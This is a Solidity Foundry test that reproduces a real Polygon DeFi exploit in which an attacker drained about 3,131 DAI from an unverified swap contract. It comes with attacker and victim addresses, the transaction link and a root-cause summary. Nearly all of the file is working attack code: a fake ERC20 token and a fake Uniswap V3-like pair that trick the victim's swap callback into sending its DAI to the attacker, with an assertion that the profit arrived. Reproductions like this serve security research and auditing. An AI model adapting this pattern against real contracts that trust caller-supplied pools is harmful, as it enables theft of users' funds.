// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";

// @KeyInfo - Total Lost : 3,131.11 DAI
// Attacker : 0xe4B97Db5FAF476DB464Bc271097Fac97d6CE3783
// Attack Contract : 0x672321F6c952000b5f0b26952D85c98cdDd06D93
// Vulnerable Contract : 0xd132B6e4CdB57E8E992C9b968CD4CcdDE3B0bafF
// Attack Tx : https://polygonscan.com/tx/0xf90407e2be3834d8534869af41849f72e9fea666cd7e23bf5c52a2fc0a497a75
//
// @Info
// Vulnerable Contract Code : https://polygonscan.com/address/0xd132B6e4CdB57E8E992C9b968CD4CcdDE3B0bafF#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/1675
//
// Attack summary: The attacker supplied a fake ERC20 token and fake Uniswap V3-like pair to an unverified victim
// entrypoint. The fake pair then forced the victim's swap callback to transfer Polygon DAI.
// Root cause: The victim trusted attacker-supplied pair/callback data and did not authenticate a real pool before
// paying DAI during the callback.

address constant ATTACKER = 0xe4B97Db5FAF476DB464Bc271097Fac97d6CE3783;
address constant VULNERABLE_CONTRACT = 0xd132B6e4CdB57E8E992C9b968CD4CcdDE3B0bafF;
address constant DAI = 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063;

interface IERC20 {
    function balanceOf(
        address account
    ) external view returns (uint256);
    function transfer(
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IUniswapV3SwapCallback {
    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external;
}

interface IVulnerableSwap {
    function swapSingleToken(
        address pair,
        address from,
        address token,
        bool zeroForOne,
        uint256 amount
    ) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 75_288_028;
        vm.createSelectFork("polygon", forkBlock);

        fundingToken = DAI;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(VULNERABLE_CONTRACT, "Vulnerable Contract");
        vm.label(DAI, "Polygon DAI");
    }

    function testExploit() public balanceLog {
        uint256 attackerDaiBefore = IERC20(DAI).balanceOf(ATTACKER);

        // step 1: deploy fresh attacker-controlled helpers equivalent to the initcode-created trace contracts.
        vm.startPrank(ATTACKER);
        AttackHelper attackHelper = new AttackHelper(VULNERABLE_CONTRACT, DAI, ATTACKER);
        vm.label(address(attackHelper), "Local Attack Helper");
        vm.label(address(attackHelper.fakeToken()), "Fake Token");
        vm.label(address(attackHelper.fakePair()), "Fake Pair");

        // step 2: trigger the unverified victim selector with the decoded fake pair/token arguments.
        attackHelper.execute();
        vm.stopPrank();

        // step 3: prove the victim-funded DAI reached the attacker's final receiver.
        uint256 attackerDaiAfter = IERC20(DAI).balanceOf(ATTACKER);
        assertGt(attackerDaiAfter - attackerDaiBefore, 3000 ether);
    }
}

contract AttackHelper {
    address private immutable victim;
    address private immutable dai;
    address private immutable profitReceiver;

    FakeToken public immutable fakeToken;
    FakePair public immutable fakePair;

    constructor(
        address victim_,
        address dai_,
        address profitReceiver_
    ) {
        victim = victim_;
        dai = dai_;
        profitReceiver = profitReceiver_;

        fakeToken = new FakeToken(address(this));
        fakePair = new FakePair(address(fakeToken), dai, profitReceiver);
    }

    function execute() external {
        uint256 fakeAmount = 1 ether;
        fakeToken.approve(victim, fakeAmount);

        IVulnerableSwap(victim).swapSingleToken(address(fakePair), address(this), address(fakeToken), false, fakeAmount);
    }
}

contract FakePair {
    address public immutable token0;
    address public immutable token1;
    address private immutable profitReceiver;

    constructor(
        address token0_,
        address token1_,
        address profitReceiver_
    ) {
        token0 = token0_;
        token1 = token1_;
        profitReceiver = profitReceiver_;
    }

    function swap(
        address,
        bool,
        int256 amountSpecified,
        uint160,
        bytes calldata
    ) external returns (int256, int256) {
        uint256 victimDaiBalance = IERC20(token1).balanceOf(msg.sender);

        // step 3: request the victim's DAI during the callback, matching the trace's pair-controlled callback.
        IUniswapV3SwapCallback(msg.sender)
            .uniswapV3SwapCallback(int256(victimDaiBalance), -amountSpecified, abi.encode(token1));

        uint256 receivedDai = IERC20(token1).balanceOf(address(this));
        IERC20(token1).transfer(profitReceiver, receivedDai);

        return (0, 0);
    }
}

contract FakeToken {
    string public constant name = "FK";
    string public constant symbol = "Fake";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(
        address holder
    ) {
        totalSupply = 1 ether;
        balanceOf[holder] = totalSupply;
    }

    function approve(
        address spender,
        uint256 amount
    ) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(
        address to,
        uint256 amount
    ) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        uint256 approved = allowance[from][msg.sender];
        if (approved != type(uint256).max) {
            allowance[from][msg.sender] = approved - amount;
        }

        _transfer(from, to, amount);
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}
